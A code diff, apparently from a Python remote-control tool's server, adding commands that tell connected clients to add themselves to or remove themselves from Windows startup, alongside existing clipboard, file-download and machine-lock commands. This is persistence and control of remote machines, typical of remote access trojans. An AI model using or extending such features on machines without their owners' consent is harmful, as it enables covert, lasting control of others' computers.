@@ -39,6 +39,8 @@ interface_help = """--h | See this Help Message
 --d | Download file from the web
 --c | Copies to Client Clipboard
 --p | Returns Client Current Clipboard
+--t 1 | Add to Startup (Windows)
+--t 2 | Remove from Startup (Windows)
 --q 1 | Lock Client Machine (Windows)
 --q 2 | Shutdown Client Machine
 --q 3 | Restart Client Machine
@@ -569,6 +571,18 @@ class MultiServer(object):
         self.refresh_connections()
         return True
 
+    def add_startup(self, conn) -> (bool, str):
+        """ Add Client to Startup """
+        # returns True/False, None/error
+        self.send(conn, json_dumps(['ADD_STARTUP']))
+        return json_loads(self.receive(conn))
+
+    def remove_startup(self, conn) -> (bool, str):
+        """ Remove Client from Startup """
+        # returns True/False, None/error
+        self.send(conn, json_dumps(['REMOVE_STARTUP']))
+        return json_loads(self.receive(conn))
+
     def lock(self, conn) -> bool:
         """ Lock Client Machine (Windows Only) """
         # Returns bool
@@ -704,6 +718,22 @@ class MultiServer(object):
         if '--p' in command:
             self.get_clipboard(conn, _print=True)
             return
+        if command [:3] == '--t':
+            select = command[4:].strip()
+            if select == '1':
+                result, error = self.add_startup(conn)
+                if result:
+                    print('Client added to Startup')
+                else:
+                    print(error)
+                return
+            if select == '2':
+                result, error = self.remove_startup(conn)
+                if result:
+                    print('Removed Client from Startup')
+                else:
+                    print(error)
+                return
         if command[:3] == '--q':
             command = command[4:].strip()
             if command == '1':
